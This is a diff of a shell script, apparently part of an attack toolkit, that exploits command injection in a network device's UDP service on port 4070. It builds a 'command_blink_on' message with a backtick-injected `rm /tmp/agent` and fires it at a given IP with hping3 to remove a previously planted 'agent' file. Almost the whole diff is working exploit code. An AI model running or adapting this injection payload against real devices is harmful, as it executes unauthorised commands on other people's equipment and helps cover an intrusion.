@@ -29,8 +29,8 @@ CMDEXEC=`which hping3`
 EXPECTED_ARGS=2;
 if [ $# -ne $EXPECTED_ARGS ]
 then
-	echo "Usage: ./clean.sh <ip> <mac>"
-  echo "Example: ./clean.sh 10.0.0.1 00:11:22:33:44:55"
+	echo "Usage: ./agentclean.sh <ip> <mac>"
+  echo "Example: ./agentclean.sh 10.0.0.1 00:11:22:33:44:55"
 	exit 1
 fi
 
@@ -42,12 +42,13 @@ then
 else
   cd ./datafiles
 fi
-echo 'command_blink_on;044;'${TMAC}';1`rm /tmp/agent`;' > data1.txt
+echo 'command_blink_on;044;'$2';1`rm /tmp/agent`;' > data1.txt
 echo "[*] Data File Created."
 
 echo "[*] Executing"
 echo "[*] Sending Payload 1"
-${CMDEXEC} -2 -p 4070 -c 1 -E data1.txt -d 150 ${TARGET} 2> /dev/null
+${CMDEXEC} -2 -p 4070 -c 1 -E data1.txt -d 150 $1 2> /dev/null
 echo ""
 cd ../
-echo "[*] 'agent' Script Removed."
+echo "[*] 'agent' script removed from $1"
+exit 1
